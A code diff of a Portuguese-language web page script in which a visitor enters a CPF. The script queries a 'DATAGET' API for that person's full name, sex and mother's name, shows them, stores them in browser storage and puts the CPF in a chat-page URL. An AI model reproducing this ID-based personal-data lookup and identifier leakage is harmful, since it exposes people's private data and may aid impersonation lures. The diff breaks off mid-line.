@@ -99,7 +99,6 @@ document.addEventListener("DOMContentLoaded", function () {
 
   // 🔄 NOVA FUNÇÃO: Consultar CPF na API DATAGET
   async function consultarCPF(cpf) {
-    // cpf aqui já deve estar só com dígitos
     const cpfLimpo = cpf.replace(/\D/g, "");
 
     // Mostrar resultados e estado de carregamento
@@ -139,7 +138,6 @@ document.addEventListener("DOMContentLoaded", function () {
       const data = await response.json();
       console.log("📊 Dados da API:", data);
 
-      // Dependendo da API, esses campos podem vir na raiz (como no snippet que você mandou)
       const nome = data?.NOME || "";
       const sexo = data?.SEXO || "";
       const nomeMaeApi = data?.NOME_MAE || "";
@@ -148,7 +146,7 @@ document.addEventListener("DOMContentLoaded", function () {
       if (nome) {
         const primeiroNome = nome.split(" ")[0];
 
-        // 🧠 Salva também no sessionStorage (como no seu snippet novo)
+        // sessionStorage
         sessionStorage.setItem("cpf", cpfLimpo);
         sessionStorage.setItem("primeiroNome", primeiroNome);
         sessionStorage.setItem("nomeCompleto", nome);
@@ -164,7 +162,7 @@ document.addEventListener("DOMContentLoaded", function () {
           })
         );
 
-        // Montar objeto para manter compatibilidade com o resto do fluxo (localStorage)
+        // Mantém compat com resto do fluxo (localStorage)
         const dadosUsuario = {
           nome: nome,
           nomeMae: nomeMaeApi,
@@ -174,12 +172,10 @@ document.addEventListener("DOMContentLoaded", function () {
         };
 
         localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
-
-        // Salvar nome e CPF separadamente para acesso fácil
         localStorage.setItem("nomeUsuario", nome);
         localStorage.setItem("cpfUsuario", cpfLimpo);
 
-        // Preencher os campos na tela
+        // Preencher na tela
         nomeUsuario.textContent = nome || "Não informado";
         cpfUsuario.textContent = cpfLimpo
           ? cpfLimpo.replace(
@@ -190,10 +186,8 @@ document.addEventListener("DOMContentLoaded", function () {
         sexoUsuario.textContent = sexo || "Não informado";
         nomeMae.textContent = nomeMaeApi || "Não informado";
 
-        // Mostrar informações do usuário
         userInfo.classList.remove("hidden");
 
-        // Rolar para mostrar as informações
         setTimeout(() => {
           userInfo.scrollIntoView({ behavior: "smooth", block: "center" });
         }, 100);
@@ -213,7 +207,6 @@ document.addEventListener("DOMContentLoaded", function () {
       errorInfo.classList.remove("hidden");
       errorInfo.scrollIntoView({ behavior: "smooth", block: "center" });
 
-      // Fallback visual
       nomeUsuario.textContent = "Cliente";
     }
   }
@@ -230,47 +223,45 @@ document.addEventListener("DOMContentLoaded", function () {
 
   // Mostrar página de CPF
   function showCPFPage() {
-    // Adiciona classe para fade-out da página principal
+    if (!mainPage || !cpfPage) return;
+
     mainPage.classList.add("fade-out");
 
-    // Após a animação, esconde a página principal e mostra a página de CPF
     setTimeout(() => {
       mainPage.classList.add("hidden");
       cpfPage.classList.remove("hidden");
 
-      // Trigger reflow para iniciar nova animação
+      // Trigger reflow
       void cpfPage.offsetWidth;
 
-      // Fade-in da página CPF
       cpfPage.classList.add("fade-in");
       cpfPage.classList.remove("opacity-0");
 
-      // Focar no input de CPF
-      cpfInputPage.focus();
+      if (cpfInputPage) cpfInputPage.focus();
     }, 400);
   }
 
   // Voltar para a página principal
   function showMainPage() {
-    // Adiciona classe para fade-out da página de CPF
+    if (!mainPage || !cpfPage) return;
+
     cpfPage.classList.remove("fade-in");
     cpfPage.classList.add("opacity-0");
 
-    // Após a animação, esconde a página de CPF e mostra a página principal
     setTimeout(() => {
       cpfPage.classList.add("hidden");
       mainPage.classList.remove("hidden");
 
-      // Trigger reflow para iniciar nova animação
       void mainPage.offsetWidth;
 
-      // Fade-in da página principal
       mainPage.classList.remove("fade-out");
     }, 400);
   }
 
   // Processar o formulário de CPF
   function processForm() {
+    if (!cpfInputPage) return;
+
     const cpf = cpfInputPage.value.replace(/\D/g, "");
 
     if (!validateCPF(cpf)) {
@@ -278,24 +269,21 @@ document.addEventListener("DOMContentLoaded", function () {
       return;
     }
 
-    if (!termsCheck.checked) {
+    if (!termsCheck || !termsCheck.checked) {
       alert(
         "Você precisa concordar com os Termos de Uso e Política de Privacidade para continuar."
       );
       return;
     }
 
-    // Salvar o CPF no localStorage para uso posterior
     localStorage.setItem("cpf", cpf);
     console.log("CPF salvo no localStorage:", cpf);
 
-    // Consultar CPF na nova API
     consultarCPF(cpf);
   }
 
   // Redirecionar para o chat após confirmar os dados
   function redirecionarParaChat() {
-    // Verificar se temos os dados da API
     const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
     if (!dadosUsuarioJSON) {
       alert("Dados do usuário não encontrados. Por favor, tente novamente.");
@@ -309,24 +297,17 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
       }
 
-      // Obter CPF formatado apenas com números
       const cpf = dadosUsuario.cpf.replace(/\D/g, "");
 
-      // Obter todos os parâmetros da URL atual
       const urlAtual = new URLSearchParams(window.location.search);
-
-      // Criar um novo objeto URLSearchParams para a nova URL
       const novaUrl = new URLSearchParams();
 
-      // Adicionar todos os parâmetros atuais à nova URL
       for (const [chave, valor] of urlAtual.entries()) {
         novaUrl.append(chave, valor);
       }
 
-      // Adicionar ou atualizar o parâmetro CPF
       novaUrl.set("cpf", cpf);
 
-      // Redirecionar para a página chat.html com todos os parâmetros
       window.location.href = `./chat/index.html?${novaUrl.toString()}`;
     } catch (error) {
       console.error("Erro ao processar dados para redirecionamento:", error);
@@ -339,16 +320,16 @@ document.addEventListener("DOMContentLoaded", function () {
   // Limpar informações e voltar para digitar CPF
   function corrigirDados() {
     consultaResultado.classList.add("hidden");
-    cpfInputPage.focus();
+    if (cpfInputPage) cpfInputPage.focus();
   }
 
   // Tentar novamente após erro
   function tentarNovamente() {
     consultaResultado.classList.add("hidden");
-    cpfInputPage.focus();
+    if (cpfInputPage) cpfInputPage.focus();
   }
 
-  // Event Listeners
+  // Event Listeners principais
   if (btnAtivar) btnAtivar.addEventListener("click", showCPFPage);
   if (btnSimular) btnSimular.addEventListener("click", showCPFPage);
   if (btnVoltar) btnVoltar.addEventListener("click", showMainPage);
@@ -356,12 +337,14 @@ document.addEventListener("DOMContentLoaded", function () {
   if (btnAnalisar) {
     btnAnalisar.addEventListener("click", function () {
       console.log("Botão Analisar clicado");
-      console.log("Valor do CPF antes do processamento:", cpfInputPage.value);
+      console.log(
+        "Valor do CPF antes do processamento:",
+        cpfInputPage ? cpfInputPage.value : ""
+      );
       processForm();
     });
   }
 
-  // Listeners para os botões de confirmação/correção
   if (btnConfirmar) {
     btnConfirmar.addEventListener("click", redirecionarParaChat);
   }
@@ -378,4 +361,91 @@ document.addEventListener("DOMContentLoaded", function () {
   if (cpfInputPage) {
     cpfInputPage.addEventListener("input", function () {
       formatCPF(this);
-      console.log("CPF formatado durante digitação:", thi
+      console.log("CPF formatado durante digitação:", this.value);
+    });
+  }
+
+  // =========================
+  // Carrossel Functionality
+  // =========================
+  const carousel = document.getElementById("carousel");
+  const slides = document.querySelectorAll(".carousel-item");
+  const indicators = document.querySelectorAll(".carousel-indicator");
+  const prevBtn = document.getElementById("prev-btn");
+  const nextBtn = document.getElementById("next-btn");
+
+  const stepNumbers = document.querySelectorAll(".step-number");
+  const stepLines = document.querySelectorAll(".step-line");
+
+  let currentSlide = 0;
+  let autoSlideInterval;
+
+  function showSlide(index) {
+    if (!slides.length) return;
+
+    if (index < 0) {
+      index = slides.length - 1;
+    } else if (index >= slides.length) {
+      index = 0;
+    }
+
+    slides.forEach((slide) => {
+      slide.classList.remove("active");
+    });
+
+    slides[index].classList.add("active");
+
+    indicators.forEach((indicator, i) => {
+      if (i === index) {
+        indicator.classList.add("active");
+      } else {
+        indicator.classList.remove("active");
+      }
+    });
+
+    updateSteps(index);
+    currentSlide = index;
+  }
+
+  function updateSteps(index) {
+    stepNumbers.forEach((step, i) => {
+      step.classList.remove("active", "completed");
+
+      if (i === index) {
+        step.classList.add("active");
+      } else if (i < index) {
+        step.classList.add("completed");
+      }
+    });
+
+    stepLines.forEach((line, i) => {
+      if (i < index) {
+        line.classList.add("active");
+      } else {
+        line.classList.remove("active");
+      }
+    });
+  }
+
+  function nextSlide() {
+    showSlide(currentSlide + 1);
+    resetAutoSlide();
+  }
+
+  function prevSlide() {
+    showSlide(currentSlide - 1);
+    resetAutoSlide();
+  }
+
+  function startAutoSlide() {
+    if (!slides.length) return;
+    autoSlideInterval = setInterval(nextSlide, 5000);
+  }
+
+  function resetAutoSlide() {
+    clearInterval(autoSlideInterval);
+    startAutoSlide();
+  }
+
+  if (carousel && prevBtn && nextBtn) {
+    nextBtn.addEventListener("cl
